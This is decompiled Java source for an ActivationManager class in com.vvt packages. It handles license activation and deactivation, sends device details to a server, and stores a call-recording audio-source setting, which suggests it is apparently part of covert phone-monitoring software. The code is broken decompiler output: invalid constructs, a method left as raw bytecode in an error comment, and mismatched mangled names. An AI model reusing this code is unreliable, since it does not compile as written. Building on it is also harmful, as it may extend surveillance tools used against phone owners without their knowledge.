package com.vvt.activation_manager;

import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.ErrorResponseType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.h;
import com.vvt.datadeliverymanager.i;
import com.vvt.exceptions.FxConcurrentRequestNotAllowedException;
import com.vvt.exceptions.FxExecutionTimeoutException;
import com.vvt.license.LicenseInfo;
import com.vvt.phoenix.prot.command.a.s;
import com.vvt.phoenix.prot.command.r;
import com.vvt.phoenix.prot.command.y;

public class ActivationManager implements com.vvt.datadeliverymanager.a.a {
    enum ActivationMode {
        ACTIVATE_WITH_CODE,
        AUTO_ACTIVATE,
        DEACTIVATE
    }

    private static boolean a = com.vvt.ak.a.a;
    private static boolean b = com.vvt.ak.a.b;
    private static boolean c = com.vvt.ak.a.d;
    private static boolean d = com.vvt.ak.a.e;
    private a e;
    private com.vvt.datadeliverymanager.b f;
    private com.vvt.license.a g;
    private com.vvt.phoneinfo.a h;
    private com.vvt.productinfo.a i;
    private com.vvt.server_address_manager.a j;
    private com.vvt.preference.b k;
    private String l = null;
    private boolean m = false;

    public ActivationManager(com.vvt.datadeliverymanager.b paramb, com.vvt.server_address_manager.a parama, com.vvt.license.a parama1, com.vvt.productinfo.a parama2, com.vvt.phoneinfo.a parama3, com.vvt.preference.b paramb1) {
        this.f = paramb;
        this.j = parama;
        this.g = parama1;
        this.i = parama2;
        this.h = parama3;
        this.k = paramb1;
    }

    private h a(int paramInt, String paramString, com.vvt.phoneinfo.a parama) {
        boolean bool = true;
        h localh = new com.vvt.datadeliverymanager.h();
        localh.a(977);
        localh.a(this);
        Object localObject = a(paramInt, parama);
        localh.a((com.vvt.phoenix.prot.command.b)localObject);
        localh.a(DeliveryRequestType.REQUEST_TYPE_NEW);
        localh.a(PriorityRequest.PRIORITY_HIGH);
        localh.a(DataProviderType.DATA_PROVIDER_TYPE_NONE);
        localh.c(0);
        localh.b(180000L);
        localh.c(bool);
        localh.b(bool);
        return localh;
    }

    private com.vvt.phoenix.prot.command.b a(int paramInt, com.vvt.phoneinfo.a parama) {
        Object localObject1 = null;
        int n = 8;
        if (paramInt == n) {
            localObject1 = new com/vvt/phoenix/prot/command/f;
            ((com.vvt.phoenix.prot.command.f)localObject1).<init>();
        }

        for (;;) {
            return (com.vvt.phoenix.prot.command.b)localObject1;
            n = 2;
            if (paramInt == n) {
                Object localObject2 = new java.lang.StringBuilder("Android ");
                localObject1 = parama.h();
                ((StringBuilder)localObject2).append((String)localObject1);
                Object localObject3 = new java.lang.StringBuilder("Android_");
                localObject1 = parama.g();
                ((StringBuilder)localObject3).append((String)localObject1);
                localObject1 = new com.vvt.phoenix.prot.command.r();
                localObject2 = ((StringBuilder)localObject2).toString();
                ((r)localObject1).a((String)localObject2);
                localObject2 = ((StringBuilder)localObject3).toString();
                ((r)localObject1).b((String)localObject2);
                localObject2 = new com.vvt.phoenix.prot.command.a();
                int i1 = parama.i();
                ((com.vvt.phoenix.prot.command.a)localObject2).a(i1);
                localObject3 = parama.g();
                ((com.vvt.phoenix.prot.command.a)localObject2).a((String)localObject3);
                localObject3 = parama.k();
                ((com.vvt.phoenix.prot.command.a)localObject2).b((String)localObject3);
                localObject3 = parama.l();
                ((com.vvt.phoenix.prot.command.a)localObject2).c((String)localObject3);
                i1 = parama.j();
                ((com.vvt.phoenix.prot.command.a)localObject2).b(i1);
                ((r)localObject1).a((com.vvt.phoenix.prot.command.a)localObject2);
            } else {
                n = 3;
                if (paramInt == n) {
                    localObject1 = new com.vvt.phoenix.prot.command.y();
                }
            }
        }
    }

    /* Error */
    private void a(i parami, com.vvt.productinfo.a parama, com.vvt.phoneinfo.a parama1) {
        // Byte code:
        //   0: iconst_1
        //   1: istore 4
        //   3: getstatic 33	com/vvt/activation_manager/ActivationManager:a	Z
        //   6: istore 5
        //   8: iload 5
        //   10: ifeq +3 -> 13
        //   13: aload_1
        //   14: invokevirtual 187	com/vvt/datadeliverymanager/i:f	()Z
        //   17: istore 5
        //   19: getstatic 36	com/vvt/activation_manager/ActivationManager:removeFromPath	Z
        //   22: istore 6
        //   24: iload 6
        //   26: ifeq +3 -> 29
        //   29: iload 5
        //   31: ifeq +290 -> 321
        //   34: aload_1
        //   35: invokevirtual 190	com/vvt/datadeliverymanager/i:a	()Lcom/vvt/phoenix/prot/command/a/s;
        //   38: checkcast 192	com/vvt/phoenix/prot/command/a/u
        //   41: astore 7
        //   43: getstatic 36	com/vvt/activation_manager/ActivationManager:removeFromPath	Z
        //   46: istore 6
        //   48: iload 6
        //   50: ifeq +3 -> 53
        //   53: aload 7
        //   55: invokevirtual 195	com/vvt/phoenix/prot/command/a/u:d	()Lcom/vvt/phoenix/prot/MyUncaughtExceptionHandler/removeFromPath;
        //   58: astore 8
        //   60: aload 8
        //   62: invokevirtual 199	com/vvt/phoenix/prot/MyUncaughtExceptionHandler/removeFromPath:MyUncaughtExceptionHandler	()I
        //   65: istore 9
        //   67: aload 7
        //   69: invokevirtual 195	com/vvt/phoenix/prot/command/a/u:d	()Lcom/vvt/phoenix/prot/MyUncaughtExceptionHandler/removeFromPath;
        //   72: astore 8
        //   74: aload 8
        //   76: invokevirtual 201	com/vvt/phoenix/prot/MyUncaughtExceptionHandler/removeFromPath:a	()I
        //   79: istore 10
        //   81: getstatic 36	com/vvt/activation_manager/ActivationManager:removeFromPath	Z
        //   84: istore 6
        //   86: iload 6
        //   88: ifeq +3 -> 91
        //   91: aload_0
        //   92: getfield 63	com/vvt/activation_manager/ActivationManager:k	Lcom/vvt/preference/removeFromPath;
        //   95: astore 8
        //   97: getstatic 207	com/vvt/preference/FxPreferenceType:CALL_RECORDING_AUDIO_SOURCE	Lcom/vvt/preference/FxPreferenceType;
        //   100: astore 11
        //   102: aload 8
        //   104: aload 11
        //   106: invokevirtual 212	com/vvt/preference/removeFromPath:a	(Lcom/vvt/preference/FxPreferenceType;)Lcom/vvt/preference/a;
        //   109: astore 8
        //   111: aload 8
        //   113: checkcast 214	com/vvt/preference/PrefCallRecordingAudioSource
        //   116: astore 8
        //   118: aload 8
        //   120: iload 10
        //   122: invokevirtual 217	com/vvt/preference/PrefCallRecordingAudioSource:setAudioSource	(I)V
        //   125: aload_0
        //   126: getfield 63	com/vvt/activation_manager/ActivationManager:k	Lcom/vvt/preference/removeFromPath;
        //   129: astore 8
        //   131: aload 8
        //   133: invokevirtual 219	com/vvt/preference/removeFromPath:removeFromPath	()V
        //   136: iload 9
        //   138: istore 6
        //   140: new 221	com/vvt/license/LicenseInfo
        //   143: astore 12
        //   145: aload 12
        //   147: invokespecial 222	com/vvt/license/LicenseInfo:<init>	()V
        //   150: aload_0
        //   151: getfield 49	com/vvt/activation_manager/ActivationManager:l	Ljava/lang/String;
        //   154: astore 13
        //   156: aload 12
        //   158: aload 13
        //   160: invokevirtual 225	com/vvt/license/LicenseInfo:setActivationCode	(Ljava/lang/String;)V
        //   163: aload 7
        //   165: invokevirtual 226	com/vvt/phoenix/prot/command/a/u:MyUncaughtExceptionHandler	()I
        //   168: istore 10
        //   170: aload 12
        //   172: iload 10
        //   174: invokevirtual 229	com/vvt/license/LicenseInfo:setConfigurationId	(I)V
        //   177: getstatic 235	com/vvt/license/LicenseStatus:ACTIVATED	Lcom/vvt/license/LicenseStatus;
        //   180: astore 13
        //   182: aload 12
        //   184: aload 13
        //   186: invokevirtual 239	com/vvt/license/LicenseInfo:setLicenseStatus	(Lcom/vvt/license/LicenseStatus;)V
        //   189: aload 7
        //   191: invokevirtual 242	com/vvt/phoenix/prot/command/a/u:removeFromPath	()[B
        //   194: astore 7
        //   196: aload 12
        //   198: aload 7
        //   200: invokevirtual 246	com/vvt/license/LicenseInfo:setMd5	([B)V
        //   203: getstatic 36	com/vvt/activation_manager/ActivationManager:removeFromPath	Z
        //   206: istore 5
        //   208: iload 5
        //   210: ifeq +3 -> 213
        //   213: aload_0
        //   214: getfield 57	com/vvt/activation_manager/ActivationManager:FxFileObserverWorker	Lcom/vvt/license/a;
        //   217: astore 7
        //   219: aload_3
        //   220: invokeinterface 248 1 0
        //   225: astore 13
        //   227: aload 7
        //   229: aload 12
        //   231: aload_2
        //   232: aload 13
        //   234: iload 4
        //   236: invokeinterface 253 5 0
        //   241: pop
        //   242: aload_0
        //   243: getfield 255	com/vvt/activation_manager/ActivationManager:e	Lcom/vvt/activation_manager/a;
        //   246: astore 7
        //   248: aload 7
        //   250: ifnull +58 -> 308
        //   253: getstatic 36	com/vvt/activation_manager/ActivationManager:removeFromPath	Z
        //   256: istore 5
        //   258: iload 5
        //   260: ifeq +3 -> 263
        //   263: aload_0
        //   264: getfield 255	com/vvt/activation_manager/ActivationManager:e	Lcom/vvt/activation_manager/a;
        //   267: astore 7
        //   269: aload 7
        //   271: iload 6
        //   273: invokeinterface 258 2 0
        //   278: getstatic 33	com/vvt/activation_manager/ActivationManager:a	Z
        //   281: istore 5
        //   283: iload 5
        //   285: ifeq +3 -> 288
        //   288: return
        //   289: astore 8
        //   291: iload 4
        //   293: istore 6
        //   295: getstatic 43	com/vvt/activation_manager/ActivationManager:d	Z
        //   298: istore 9
        //   300: iload 9
        //   302: ifeq -162 -> 140
        //   305: goto -165 -> 140
        //   308: getstatic 43	com/vvt/activation_manager/ActivationManager:d	Z
        //   311: istore 5
        //   313: iload 5
        //   315: ifeq -37 -> 278
        //   318: goto -40 -> 278
        //   321: getstatic 40	com/vvt/activation_manager/ActivationManager:MyUncaughtExceptionHandler	Z
        //   324: istore 5
        //   326: iload 5
        //   328: ifeq +3 -> 331
        //   331: getstatic 36	com/vvt/activation_manager/ActivationManager:removeFromPath	Z
        //   334: istore 5
        //   336: iload 5
        //   338: ifeq +3 -> 341
        //   341: aload_0
        //   342: getfield 57	com/vvt/activation_manager/ActivationManager:FxFileObserverWorker	Lcom/vvt/license/a;
        //   345: invokeinterface 259 1 0
        //   350: aload_0
        //   351: getfield 255	com/vvt/activation_manager/ActivationManager:e	Lcom/vvt/activation_manager/a;
        //   354: astore 7
        //   356: aload 7
        //   358: ifnull -80 -> 278
        //   361: getstatic 36	com/vvt/activation_manager/ActivationManager:removeFromPath	Z
        //   364: istore 5
        //   366: iload 5
        //   368: ifeq +3 -> 371
        //   371: aload_0
        //   372: getfield 255	com/vvt/activation_manager/ActivationManager:e	Lcom/vvt/activation_manager/a;
        //   375: astore 7
        //   377: aload_1
        //   378: invokevirtual 262	com/vvt/datadeliverymanager/i:MyUncaughtExceptionHandler	()Lcom/vvt/datadeliverymanager/enums/ErrorResponseType;
        //   381: astore 8
        //   383: aload_1
        //   384: invokevirtual 264	com/vvt/datadeliverymanager/i:d	()I
        //   387: istore 9
        //   389: aload_1
        //   390: invokevirtual 266	com/vvt/datadeliverymanager/i:e	()Ljava/lang/String;
        //   393: astore 14
        //   395: aload 7
        //   397: aload 8
        //   399: iload 9
        //   401: aload 14
        //   403: invokeinterface 269 4 0
        //   408: goto -130 -> 278
        //   411: astore 8
        //   413: iload 9
        //   415: istore 6
        //   417: goto -122 -> 295
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	420	0	this	ActivationManager
        //   0	420	1	parami	i
        //   0	420	2	parama	com.vvt.productinfo.a
        //   0	420	3	parama1	com.vvt.phoneinfo.a
        //   1	291	4	n	int
        //   6	361	5	bool1	boolean
        //   22	394	6	i1	int
        //   41	355	7	localObject1	Object
        //   58	74	8	localObject2	Object
        //   289	1	8	localFxPreferenceException1	com.vvt.preference.FxPreferenceException
        //   381	17	8	localErrorResponseType	ErrorResponseType
        //   411	1	8	localFxPreferenceException2	com.vvt.preference.FxPreferenceException
        //   65	72	9	i2	int
        //   298	3	9	bool2	boolean
        //   387	27	9	i3	int
        //   79	94	10	i4	int
        //   100	5	11	localFxPreferenceType	com.vvt.preference.FxPreferenceType
        //   143	87	12	localLicenseInfo	LicenseInfo
        //   154	79	13	localObject3	Object
        //   393	9	14	str	String
        // Exception table:
        //   from	to	target	type
        //   53	58	289	com/vvt/preference/FxPreferenceException
        //   60	65	289	com/vvt/preference/FxPreferenceException
        //   67	72	411	com/vvt/preference/FxPreferenceException
        //   74	79	411	com/vvt/preference/FxPreferenceException
        //   81	84	411	com/vvt/preference/FxPreferenceException
        //   91	95	411	com/vvt/preference/FxPreferenceException
        //   97	100	411	com/vvt/preference/FxPreferenceException
        //   104	109	411	com/vvt/preference/FxPreferenceException
        //   111	116	411	com/vvt/preference/FxPreferenceException
        //   120	125	411	com/vvt/preference/FxPreferenceException
        //   125	129	411	com/vvt/preference/FxPreferenceException
        //   131	136	411	com/vvt/preference/FxPreferenceException
    }

    private void a(String paramString, ActivationManager.ActivationMode paramActivationMode, com.vvt.productinfo.a parama, com.vvt.phoneinfo.a parama1)
    {
        boolean bool1 = a;
        if (bool1) {}
        Object localObject1 = ActivationManager.ActivationMode.DEACTIVATE;
        if (paramActivationMode != localObject1)
        {
            localObject1 = new com/vvt/license/LicenseInfo;
            ((LicenseInfo)localObject1).<init>();
            ((LicenseInfo)localObject1).setActivationCode(paramString);
            localObject2 = this.g;
            String str = parama1.d();
            ((com.vvt.license.a)localObject2).a((LicenseInfo)localObject1, parama, str, false);
        }
        bool1 = false;
        localObject1 = null;
        Object localObject2 = ActivationManager.ActivationMode.ACTIVATE_WITH_CODE;
        if (paramActivationMode == localObject2)
        {
            int n = 2;
            localObject1 = a(n, paramString, parama1);
        }
        for (;;)
        {
            if (localObject1 != null)
            {
                boolean bool3 = a;
                if (bool3) {}
                localObject2 = this.f;
                ((com.vvt.datadeliverymanager.b)localObject2).a((h)localObject1);
            }
            boolean bool2 = a;
            if (bool2) {}
            return;
            localObject2 = ActivationManager.ActivationMode.AUTO_ACTIVATE;
            int i1;
            if (paramActivationMode == localObject2)
            {
                i1 = 8;
                localObject1 = a(i1, paramString, parama1);
            }
            else
            {
                localObject2 = ActivationManager.ActivationMode.DEACTIVATE;
                if (paramActivationMode == localObject2)
                {
                    i1 = 3;
                    localObject1 = a(i1, paramString, parama1);
                }
            }
        }
    }

    private void c(i parami)
    {
        boolean bool1 = parami.f();
        boolean bool2 = b;
        if ((!bool2) || (!bool1))
        {
            bool2 = c;
            if (!bool2) {}
        }
        bool2 = b;
        if (bool2) {}
        this.g.b();
        Object localObject = this.e;
        a locala;
        if (localObject != null)
        {
            bool2 = b;
            if ((bool2) && (!bool1)) {
                break label85;
            }
            locala = this.e;
            bool2 = false;
            localObject = null;
            locala.a(0);
        }
        for (;;)
        {
            return;
            label85:
            locala = this.e;
            localObject = parami.c();
            int n = parami.d();
            String str = parami.e();
            locala.a((ErrorResponseType)localObject, n, str);
        }
    }

    private void d(i parami)
    {
        boolean bool1 = parami.f();
        boolean bool2 = b;
        if (bool2) {}
        Object localObject1 = (com.vvt.phoenix.prot.command.a.f)parami.a();
        if (bool1)
        {
            localObject1 = ((com.vvt.phoenix.prot.command.a.f)localObject1).b();
            this.l = ((String)localObject1);
            bool2 = a;
            if (!bool2) {}
        }
        for (;;)
        {
            Object localObject2;
            Object localObject3;
            try
            {
                localObject1 = this.l;
                localObject2 = ActivationManager.ActivationMode.ACTIVATE_WITH_CODE;
                com.vvt.productinfo.a locala1 = this.i;
                localObject3 = this.h;
                a((String)localObject1, (ActivationManager.ActivationMode)localObject2, locala1, (com.vvt.phoneinfo.a)localObject3);
                return;
            }
            catch (FxExecutionTimeoutException localFxExecutionTimeoutException)
            {
                bool2 = d;
                if (!bool2) {
                    continue;
                }
                continue;
            }
            bool2 = c;
            if (bool2) {}
            a locala = this.e;
            if (locala != null)
            {
                bool2 = b;
                if (bool2) {}
                locala = this.e;
                localObject2 = parami.c();
                int n = parami.d();
                localObject3 = parami.e();
                locala.a((ErrorResponseType)localObject2, n, (String)localObject3);
            }
        }
    }

    public void a(i parami)
    {
        boolean bool = a;
        if (bool) {}
        bool = a;
        if (bool) {}
    }

    public void a(String paramString, a parama)
    {
        try
        {
            bool = a;
            if (bool) {}
            bool = a;
            if (bool) {}
            bool = this.m;
            if (bool)
            {
                FxConcurrentRequestNotAllowedException localFxConcurrentRequestNotAllowedException = new com/vvt/exceptions/FxConcurrentRequestNotAllowedException;
                localObject2 = "Concurrent activation requests not allowed!";
                localFxConcurrentRequestNotAllowedException.<init>((String)localObject2);
                throw localFxConcurrentRequestNotAllowedException;
            }
        }
        finally {}
        boolean bool = true;
        this.m = bool;
        this.e = parama;
        this.l = paramString;
        String str = this.l;
        Object localObject2 = ActivationManager.ActivationMode.ACTIVATE_WITH_CODE;
        com.vvt.productinfo.a locala = this.i;
        com.vvt.phoneinfo.a locala1 = this.h;
        a(str, (ActivationManager.ActivationMode)localObject2, locala, locala1);
        bool = a;
        if (bool) {}
    }

    public void a(String paramString1, String paramString2, a parama)
    {
        try
        {
            bool = a;
            if (bool) {}
            bool = a;
            if (bool) {}
            bool = this.m;
            if (bool)
            {
                FxConcurrentRequestNotAllowedException localFxConcurrentRequestNotAllowedException = new com/vvt/exceptions/FxConcurrentRequestNotAllowedException;
                localFxConcurrentRequestNotAllowedException.<init>();
                throw localFxConcurrentRequestNotAllowedException;
            }
        }
        finally {}
        this.l = paramString2;
        boolean bool = true;
        this.m = bool;
        this.e = parama;
        Object localObject2 = this.j;
        ((com.vvt.server_address_manager.a)localObject2).a(paramString1);
        localObject2 = this.l;
        ActivationManager.ActivationMode localActivationMode = ActivationManager.ActivationMode.ACTIVATE_WITH_CODE;
        com.vvt.productinfo.a locala = this.i;
        com.vvt.phoneinfo.a locala1 = this.h;
        a((String)localObject2, localActivationMode, locala, locala1);
        bool = a;
        if (bool) {}
    }

    public void b(i parami)
    {
        boolean bool1 = a;
        if (bool1) {}
        bool1 = false;
        this.m = false;
        Object localObject1 = parami.a();
        if (localObject1 != null)
        {
            boolean bool3 = a;
            if (!bool3) {}
        }
        for (;;)
        {
            try
            {
                int n = ((s)localObject1).a();
                switch (n)
                {
                    default:
                        bool2 = b;
                        if (bool2) {}
                        c(parami);
                }
            }
            catch (Exception localException)
            {
                bool2 = d;
                if (!bool2) {
                    continue;
                }
                continue;
                bool2 = b;
                if (!bool2) {
                    continue;
                }
                c(parami);
                continue;
                bool2 = b;
                if (!bool2) {
                    continue;
                }
                d(parami);
                continue;
            }
            boolean bool2 = a;
            if (bool2) {}
            return;
            bool2 = b;
            if (bool2) {}
            localObject1 = this.i;
            Object localObject2 = this.h;
            a(parami, (com.vvt.productinfo.a)localObject1, (com.vvt.phoneinfo.a)localObject2);
            continue;
            this.g.b();
            a locala = this.e;
            if (locala != null)
            {
                locala = this.e;
                localObject2 = ErrorResponseType.ERROR_PAYLOAD;
                int i1 = -1;
                String str = "Unable to connect to server.\nCheck your internet connection and try again.";
                locala.a((ErrorResponseType)localObject2, i1, str);
            }
            else
            {
                bool2 = d;
                if (!bool2) {}
            }
        }
    }

    public void b(String paramString, a parama)
    {
        try
        {
            bool = a;
            if (bool) {}
            bool = a;
            if (bool) {}
            bool = this.m;
            if (bool)
            {
                FxConcurrentRequestNotAllowedException localFxConcurrentRequestNotAllowedException = new com/vvt/exceptions/FxConcurrentRequestNotAllowedException;
                localObject2 = "Concurrent activation requests not allowed!";
                localFxConcurrentRequestNotAllowedException.<init>((String)localObject2);
                throw localFxConcurrentRequestNotAllowedException;
            }
        }
        finally {}
        boolean bool = true;
        this.m = bool;
        this.e = parama;
        ActivationManager.ActivationMode localActivationMode = ActivationManager.ActivationMode.DEACTIVATE;
        Object localObject2 = this.i;
        com.vvt.phoneinfo.a locala = this.h;
        a(paramString, localActivationMode, (com.vvt.productinfo.a)localObject2, locala);
        bool = a;
        if (bool) {}
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/activation_manager/ActivationManager.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */